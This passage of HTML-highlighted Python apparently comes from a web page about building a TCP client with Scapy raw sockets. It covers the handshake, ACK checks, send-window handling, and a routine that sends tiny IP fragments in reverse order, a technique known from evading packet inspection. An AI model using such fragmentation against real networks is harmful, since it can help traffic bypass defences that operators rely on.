242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">window</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">last_sent </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_base</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_queue </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">last_ack  </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)">#let underlying handle ethernet</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">s </span><span class="token operator">=</span><span class="token plain"> conf</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">L3socket</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">R </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">RLoop</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">R</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">start</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"init: %s"</span><span class="token operator">%</span><span class="token builtin" style="color:rgb(189, 147, 249)">repr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">target</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">start</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"start"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_syn</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">match_packet</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">haslayer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">IP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">IP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dst </span><span class="token operator">==</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">IP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">src \</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">haslayer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">dport </span><span class="token operator">==</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">sport</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ack </span><span class="token operator">&lt;=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_next </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">and</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ack </span><span class="token operator">&gt;=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_start</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">           </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">else</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">               logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"ack was %d expected %d"</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_next</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">False</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">send_syn</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"SND: SYN"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flags </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"S"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_next </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">s</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">send_synack_ack</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        logger</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">debug</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"SND: SYN+ACK -&gt; ACK with ack # %d"</span><span class="token plain"> </span><span class="token operator">%</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">ack </span><span class="token operator">=</span><span class="token plain"> pkt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+</span><span class="token plain"> </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flags </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"A"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_next </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">s</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">send_data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">abort </span><span class="token operator">==</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"[-] not sending data, aborted !!!"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">False</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flags </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"PA"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        available </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_base </span><span class="token operator">+</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_window </span><span class="token operator">-</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">last_sent</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> available </span><span class="token operator">==</span><span class="token plain"> </span><span class="token number">0</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_queue </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token comment" style="color:rgb(98, 114, 164)"># have to wait</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">False</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">assert</span><span class="token plain"> available </span><span class="token operator">&gt;=</span><span class="token plain"> </span><span class="token number">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> available </span><span class="token operator">&lt;</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> chop </span><span class="token operator">=</span><span class="token plain"> d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain">available</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">available</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send_queue </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">chop</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_next </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">last_sent </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_next</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        tosend </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token operator">/</span><span class="token plain">d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">s</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">tosend</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq </span><span class="token operator">+=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">len</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">send_frag_data</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> d</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> sz</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">if</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">abort </span><span class="token operator">==</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"[-] not sending data, aborted !!!"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">assert</span><span class="token plain"> sz </span><span class="token operator">&gt;=</span><span class="token plain"> </span><span class="token number">8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">flags </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"PA"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token comment" style="color:rgb(98, 114, 164)">#tbd send window handling for fragments(?)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        dat </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token operator">/</span><span class="token plain">d</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        fragments </span><span class="token operator">=</span><span class="token plain"> fragment</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">dat</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> sz</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> f </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> fragments</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">s</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">f</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">seq_next </span><span class="token operator">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">l4</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">TCP</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span 